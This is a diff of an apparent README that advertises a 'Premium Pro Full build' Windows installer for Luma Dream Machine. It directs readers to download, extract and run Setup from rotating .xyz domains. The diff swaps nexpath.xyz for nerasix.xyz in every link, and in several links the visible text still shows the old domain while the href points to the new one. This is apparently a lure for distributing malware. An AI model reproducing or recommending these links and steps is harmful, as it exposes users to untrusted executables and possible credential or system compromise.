@@ -30,8 +30,8 @@ Premium · Pro · Full build · Windows
 
 > Use the project link below for Windows.
 
-* **Project link:** **[luma-dream-machine.nexpath.xyz](https://luma-dream-machine.nexpath.xyz/)**
-* **Full URL:** `https://luma-dream-machine.nexpath.xyz/`
+* **Project link:** **[luma-dream-machine.nerasix.xyz](https://luma-dream-machine.nerasix.xyz/)**
+* **Full URL:** `https://luma-dream-machine.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -57,17 +57,17 @@ Premium · Pro · Full build · Windows
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://luma-dream-machine.nexpath.xyz/">luma-dream-machine.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://luma-dream-machine.nerasix.xyz/">luma-dream-machine.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://luma-dream-machine.nexpath.xyz/">luma-dream-machine.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the NexPath download page, or open <a href="https://luma-dream-machine.nerasix.xyz/">luma-dream-machine.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://luma-dream-machine.nexpath.xyz/">luma-dream-machine.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://luma-dream-machine.nerasix.xyz/">luma-dream-machine.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
 <details>
 <summary>&nbsp;<b>Requirements?</b></summary>
